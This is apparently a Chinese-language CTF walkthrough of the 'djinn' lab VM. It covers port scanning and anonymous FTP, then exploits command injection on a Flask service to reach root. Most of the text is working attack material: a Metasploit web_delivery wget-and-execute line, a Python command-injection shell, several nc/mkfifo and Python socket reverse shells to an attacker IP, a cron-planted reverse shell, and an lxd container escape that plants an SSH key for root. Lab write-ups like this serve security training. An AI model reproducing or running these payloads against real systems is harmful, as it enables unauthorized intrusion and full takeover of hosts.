VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for 192.168.253.246
Host is up (0.00072s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.246 -p- -A

21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              14 Jan 12  2020 creds.txt
| -rw-r--r--    1 0        0             280 Jan 19  2020 game.txt
|_-rw-r--r--    1 0        0             275 Jan 19  2020 message.txt
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
1337/tcp open  waste?
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)


--------------------------------------------
--------------------------------------------
3、FTP信息枚举

ftp 192.168.253.246
anonymous
anonymous

cat creds.txt 
nitu:7846A$56

cat game.txt 
@0xmzfr I would like to thank you for hiring me. I won't disappoint you like SAM.
Also I've started implementing the secure way of authorizing the access to our 
network. I have provided @nitish81299 with the beta version of the key fob
hopes everything would be good.

cat message.txt 
@nitish81299, you and sam messed it all up. I've fired sam for all the fuzz he created and 
this will be your last warning if you won't put your shit together than you'll be gone as well.
I've hired @Ugtan_ as our new security head, hope  he'll do something good.


没什么有用的信息...

--------------------------------------------
--------------------------------------------
4、web信息收集


5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)

访问：
http://192.168.253.246:7331/

dirb http://192.168.253.246:7331/
http://192.168.253.246:7331/robots.txt
http://192.168.253.246:7331/source


file source        
source: Python script, ASCII text executable

有一个重要的信息：
cat source | grep URL
URL = "http://{}:5000/?username={}&password={}"

这是提示5000端口可以利用！

以及还发现：requests.post(url)

--------------------------------------------
--------------------------------------------
5、5000端口网页枚举


http://192.168.253.246:5000/
提示：
Method Not Allowed
The method is not allowed for the requested URL.
所请求的URL不允许使用该方法！


在刚才发现的源代码中也能看到是post请求：requests.post(url)
或者bp抓包，可以用OPTIONS方式进行访问，验证是什么访问方式：
Allow: POST, OPTIONS

OPTIONS请求其实是一次预检，只有非简单请求会预检。这一部分详细请参考：
https://www.jianshu.com/p/5cf82f092201



if ip and check_ip(ip) and username == "REDACTED" and password == "REDACTED":


POST /?username=REDACTED&password=REDACTED HTTP/1.1
返回：HTTP/1.0 200 OK


POST /?username=id&password=REDACTED HTTP/1.1
回显：uid=33(www-data) gid=33(www-data) groups=33(www-data)

通过测试，发现只在用户名处存在RCE漏洞（remote command/code execute），也叫远程代码/命令执行！


--------------------------------------------
--------------------------------------------
6、远程代码执行

curl -X POST '192.168.253.246:5000/?username=id'
-X 是指定请求的方式为GET还是POST


curl -X POST '192.168.253.246:5000/?username=ls'   ----有一个文件app.py
curl -X POST '192.168.253.246:5000/?username=cat%20app.py'    ----查看文件


RCE = ["|", "*", "^", "$", ";", "nc", "bash", "bin", "eval",  "python"]
发现过滤了 | ，所以base64解码的时候靠连接符拼接语句是失败的！

curl -X POST '192.168.253.246:5000/?username=uname%20-a'
Linux djinn 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

--------------------------------------------
--------------------------------------------
7、webshell

方法一：
--------------------------------------------
msf—web_delivery，利用web_delivery模块！

目标设备存在远程文件包含漏洞或者命令注入漏洞，想在目标设备上加载webshell，但不想在目标设备硬盘上留下任何webshell文件信息都可以用这个模块。（远程包含直接访问远程链接）

原理：让目标设备从远端服务器加载webshell代码至内存执行

msfconsole
use exploit/multi/script/web_delivery
set target 7     ----show targets 后选择一个
set payload linux/x64/meterpreter/reverse_tcp  ----必须依据target来自己设定payload
set lhost 192.168.253.138
set SRVPORT 7777
exploit -j -z

运行后会出现一行代码：
wget -qO atyYWf3P --no-check-certificate http://192.168.253.138:7777/CveEfHk1sXVZPj; chmod +x atyYWf3P; ./atyYWf3P& disown

先下载下来一个文件，再设置权限，执行，就可以反弹了
-qO 后是下载输出的位置，一定要放在/tmp目录下，不然会消失。
url的空格可以是%20 也可以是+


curl -X POST '192.168.253.246:5000/?username=wget+-qO+/tmp/atyYWf3P+--no-check-certificate+http://192.168.253.138:7777/CveEfHk1sXVZPj'
curl -X POST '192.168.253.246:5000/?username=ls+-la+/tmp'
curl -X POST '192.168.253.246:5000/?username=chmod+777+/tmp/atyYWf3P'
curl -X POST '192.168.253.246:5000/?username=/tmp/atyYWf3P'

成功获得反弹shell
--------------------------------------------

方法二：
--------
#!/usr/bin/python

import os
import requests

def byteEncode(string):
	result = ""
	for c in string:
		result += "\\x" + c.encode("hex")
	return result
		
def main():
	target_address = "192.168.253.246:5000"

	while(True):
		cmd = raw_input("$ ")
		cmd = byteEncode(cmd)
		cmd = 'env printf "'+cmd+'"'
		params = {"username" : 'echo `' + cmd  + '` > /tmp/tmp.sh && chmod +x /tmp/tmp.sh && /tmp/tmp.sh'}
		url = "http://" + target_address
		r = requests.post(url, params = params)
		print r.text
		
if __name__ == "__main__":
	main()
--------
cmd = raw_input("$ ")   ---$是每次执行命令都会出现的符号

nc -vlp 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 1234 >/tmp/f

python3 -c 'import pty;pty.spawn("/bin/bash")'   


--------------------------------------------
--------------------------------------------
8、内网信息收集

/usr/bin/lxcfs /var/lib/lxcfs/
127.0.0.1:25
127.0.0.1:2843

uid=0(root) gid=0(root) groups=0(root)
uid=1000(nitish) gid=1000(nitish) groups=1000(nitish),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)



--------------------------------------------
--------------------------------------------
9、.KDBX文件扩展名解密
cd /var/backups/
nitu.kdbx
看到了nitu，想起了那个ftp服务器下的三个txt文件，其中creds.txt里面就有这个nitu！
cat creds.txt 
nitu:7846A$56

什么是KDBX文件？   https://m33.wiki/extension/kdbx.html
由Windows免费密码管理器KeePass Password Safe创建的文件；
存储密码的加密数据库，该数据库只能使用用户设置的主密码进行查看；
用于安全存储Windows，电子邮件帐户，FTP站点，电子商务站点和其他目的的个人登录凭据。

python3 -m http.server
http://192.168.253.246:8000/


打开输入密码：
7846A$56

鼠标右键copy password：12秒之后就会清空你的粘贴板，赶紧粘贴
&HtMGd$LJB

su nitish
&HtMGd$LJB


--------------------------------------------
--------------------------------------------
10、命令执行

ssh nitish@192.168.253.246
&HtMGd$LJB

nitish@djinn:~$ nc 127.0.0.1 2843
username: nitish
Password: &HtMGd$LJB
1. Show all members.
2. Add a new user.
3. Show all tasks.
4. Add a new task.
5. Add a note for admin.
6. Read notes.
7. Exit
=> 

这个小游戏，研究了一会，发现5和6具有联动效应，5添加一个note名称，6会列出所有的note，由我选择查看哪一个，比如文件名为/etc/passwd，选择的时候会自动执行cat “文件名”

/;id
b'uid=1001(ugtan) gid=1001(ugtan) groups=1001(ugtan)\n'
当前用户不是nitish 而是ugtan!

利用这个机制，再来反弹一个shell：

nc -vlp 1235
/; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 1235 >/tmp/f
这样执行会报错！！！用python3吧！

note;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.253.138",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import pty;pty.spawn("/bin/bash")' 


--------------------------------------------
--------------------------------------------
11、定时任务提权


cd /var/mail
ls -la
file ugtan
ugtan: ASCII text

--------------------
From root@djinn  Mon Jan 13 19:36:24 2020
Return-Path: <root@djinn>
X-Original-To: ugtan@djinn
Delivered-To: ugtan@djinn
Received: by djinn (Postfix, from userid 0)
	id E2B7C82E9F; Mon, 13 Jan 2020 19:36:24 +0530 (IST)
Subject: Way to clean up the systems
To: <ugtan@djinn>
X-Mailer: mail (GNU Mailutils 3.4)
Message-Id: <20200113140624.E2B7C82E9F@djinn>
Date: Mon, 13 Jan 2020 19:36:24 +0530 (IST)
From: root <root@djinn>

Hey 0xmzfr,
I've setup the folder that you asked me to make in my home directory,
Since I'd be gone for a day or two you can just leave the clean.sh in
that directory and cronjob will handle the rest. 

- Ugtan_
--------------------
提示：
我已经在我的主目录中设置了你要求我创建的文件夹，
因为我会离开一两天，所以你可以把 c​​lean.sh 留在
该目录和 cronjob 将处理其余部分。

在该用户home(家)下的/home/ugtan/best/admin/ever新建clean.sh，然后定时器会自动执行！


echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 2222 >/tmp/f' > clean.sh




--------------------------------------------
--------------------------------------------
12、lxd提权（项目十九~项目二十）

ssh nitish@192.168.253.246
&HtMGd$LJB


wget http://192.168.253.138:8081/alpine-v3.13-x86_64-20210218_0139.tar.gz
chmod +x alpine-v3.13-x86_64-20210218_0139.tar.gz


lxd init
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias haxor
lxc image list   ---查看
lxc init haxor hacker -c security.privileged=true    --- -c可以提供容器所有功能
lxc list
lxc config device add hacker haxor disk source=/ path=/mnt/root recursive=true
lxc start hacker
lxc exec hacker /bin/sh  ---成功拥有root权限！！
cd /mnt/root/root   ---可以轻松进入root目录
cp authorized_keys进入即可！

将前面在ta用户下生成的rsa密钥给复制过来！在lxd容器的root权限下进行：
mkdir .ssh
cd .ssh

echo 'key放入' > authorized_keys
ssh -i ~/.ssh/id_rsa root@192.168.253.246

成功获得root的ssh-shell！！！









































